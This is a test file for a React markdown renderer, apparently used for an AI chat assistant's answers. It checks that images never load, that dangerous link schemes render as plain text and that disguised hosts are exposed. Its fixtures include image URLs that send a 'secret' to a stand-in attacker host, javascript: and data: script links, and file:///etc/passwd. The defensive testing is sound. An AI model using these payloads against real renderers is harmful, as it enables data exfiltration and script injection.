import { describe, it, expect } from 'vitest';
import type { ReactNode } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import SafeMarkdown from '@/components/SafeMarkdown';

// The renderer under test. (To check these tests against the old call sites,
// swap this for `<ReactMarkdown remarkPlugins={[remarkGfm]}>{md}</ReactMarkdown>`.)
const render = (md: string) => renderToStaticMarkup(<SafeMarkdown>{md}</SafeMarkdown>);

/** Every attribute value in the markup. */
const attributeValues = (html: string) => [...html.matchAll(/\s[\w:-]+="([^"]*)"/g)].map((m) => m[1]);
/** Visible text: the markup without tags. */
const visibleText = (html: string) => html.replace(/<[^>]*>/g, '');

const SECRET = 'evil.example/p?q=secret';

describe('SafeMarkdown: images never load', () => {
  it('renders an inline image as alt + host text', () => {
    const html = render('![x](https://evil.example/p?q=secret)');
    expect(html).not.toContain('<img');
    expect(visibleText(html)).toContain('x (evil.example)');
    for (const value of attributeValues(html)) expect(value).not.toContain(SECRET);
    expect(html).not.toContain('q=secret');
  });

  it('renders a reference-style image the same way', () => {
    const html = render('![x][pixel]\n\n[pixel]: https://evil.example/p?q=secret');
    expect(html).not.toContain('<img');
    expect(visibleText(html)).toContain('x (evil.example)');
    for (const value of attributeValues(html)) expect(value).not.toContain(SECRET);
    expect(html).not.toContain('q=secret');
  });

  it('does not render raw HTML <img>, block or inline', () => {
    for (const md of [
      '<img src="https://evil.example/p?q=secret">',
      'before <img src="https://evil.example/p?q=secret"> after',
    ]) {
      const html = render(md);
      expect(html).not.toContain('<img');
      expect(html).not.toContain('q=secret');
    }
  });

  it('keeps an image inside a link as text', () => {
    const html = render('[![badge](https://evil.example/p?q=secret)](https://github.com/x)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('q=secret');
    expect(html).toContain('href="https://github.com/x"');
  });
});

describe('SafeMarkdown: links', () => {
  it('opens an external link in a new tab with rel and shows its host', () => {
    const html = render('[click](https://evil.example/login)');
    expect(html).toContain('<a');
    expect(html).toContain('href="https://evil.example/login"');
    expect(html).toContain('target="_blank"');
    const rel = /rel="([^"]*)"/.exec(html)?.[1] ?? '';
    expect(rel.split(' ')).toEqual(expect.arrayContaining(['noopener', 'noreferrer']));
    expect(visibleText(html)).toContain('click (evil.example)');
  });

  it('keeps target and rel on trusted hosts too', () => {
    const html = render('[repo](https://github.com/Ranb972/WinQA)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(visibleText(html)).toContain('repo (github.com)');
  });

  it.each([
    ['javascript', '[x](javascript:alert(1))'],
    ['data', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript', '[x](vbscript:msgbox(1))'],
    ['file', '[x](file:///etc/passwd)'],
    ['relative', '[x](/relative)'],
    ['protocol-relative', '[x](//evil.example/x)'],
  ])('renders a %s link as inert text', (_label, md) => {
    const html = render(md);
    expect(html).not.toContain('href=');
    expect(html).not.toContain('<a');
    expect(visibleText(html)).toContain('x');
  });

  it('keeps a GFM autolink, with rel and no duplicate host', () => {
    const html = render('see https://evil.example/path for more');
    expect(html).toContain('href="https://evil.example/path"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
    expect(html).not.toContain('(evil.example)');
  });

  it('strips userinfo so a disguised host shows its real host', () => {
    const html = render('https://github.com@evil.example/');
    expect(html).toContain('href="https://evil.example/"');
    expect(html).toContain('(evil.example)');
    expect(html).not.toContain('href="https://github.com@');
  });

  it('skips the host suffix when the text is the host', () => {
    const html = render('[evil.example](https://evil.example/)');
    expect(html).not.toContain('(evil.example)');
  });

  it('does not let caller components replace the safe a and img', () => {
    const hostile = {
      // eslint-disable-next-line @next/next/no-img-element -- a hostile override the test expects to be ignored
      img: ({ src }: { src?: string }) => <img src={src ?? 'https://evil.example/p?q=secret'} alt="" />,
      a: ({ children }: { children?: ReactNode }) => <a href="javascript:alert(1)">{children}</a>,
    } as unknown as Omit<Components, 'a' | 'img'>;
    const html = renderToStaticMarkup(
      <SafeMarkdown components={hostile}>{'![x](https://evil.example/p?q=secret) [y](javascript:alert(1))'}</SafeMarkdown>,
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('href=');
  });
});

describe('SafeMarkdown: styling passes through', () => {
  // The ChatMessage code renderer, verbatim in shape.
  const chatComponents: Omit<Components, 'a' | 'img'> = {
    code({ className, children }) {
      const match = /language-(\w+)/.exec(className || '');
      if (!match) {
        return <code className="bg-white/[0.02] px-1.5 py-0.5 rounded text-orange-500">{children}</code>;
      }
      return (
        <pre className="bg-white/[0.02] rounded-lg p-4 overflow-x-auto">
          <code className="text-zinc-400 text-sm">{children}</code>
        </pre>
      );
    },
    p({ children }) {
      return <p className="text-zinc-400 mb-2 last:mb-0">{children}</p>;
    },
  };

  it('renders code fences and prose exactly as the plain renderer did', () => {
    const md = 'Intro with `inline`.\n\n```ts\nconst a = "<img src=x>";\nfetch("https://evil.example");\n```\n\n- one\n- two';
    const before = renderToStaticMarkup(
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={chatComponents}>
        {md}
      </ReactMarkdown>,
    );
    const after = renderToStaticMarkup(<SafeMarkdown components={chatComponents}>{md}</SafeMarkdown>);
    expect(after).toBe(before);
    expect(after).toContain('<code class="text-zinc-400 text-sm">');
  });

  it('is what ChatMessage renders answers with', async () => {
    const { default: ChatMessage } = await import('@/components/ChatMessage');
    const html = renderToStaticMarkup(
      <ChatMessage
        role="assistant"
        content={'![x](https://evil.example/p?q=secret) [click](https://evil.example/login) `code`'}
      />,
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('q=secret');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('bg-white/[0.02] px-1.5 py-0.5 rounded text-orange-500');
  });

  it('renders GFM tables and strikethrough', () => {
    const html = render('| a | b |\n| - | - |\n| 1 | 2 |\n\n~~gone~~');
    expect(html).toContain('<table>');
    expect(html).toContain('<del>gone</del>');
  });
});
